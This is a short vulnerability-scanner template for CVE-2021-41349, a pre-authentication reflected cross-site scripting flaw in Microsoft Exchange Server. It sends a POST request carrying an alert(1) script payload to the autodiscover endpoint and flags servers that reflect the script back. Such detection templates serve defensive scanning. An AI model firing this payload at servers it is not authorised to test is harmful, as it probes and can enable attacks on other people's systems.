id: CVE-2021-41349

info:
  name: Microsoft Exchange Server Pre-Auth POST Based Reflected Cross-Site Scripting
  author: zhibing
  severity: medium
  description: |-
    Microsoft Exchange Server Spoofing Vulnerability
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41349
  tags: cve,cve2021,xss,exchange
  created: 2023/06/16

rules:
  r0:
    request:
      method: POST
      path: "/autodiscover/autodiscover.json"
      body: <script>alert(1);+"=</script>
    expression: |
      response.status == 500 && response.body.bcontains(b"<script>alert(1)")
expression: r0()
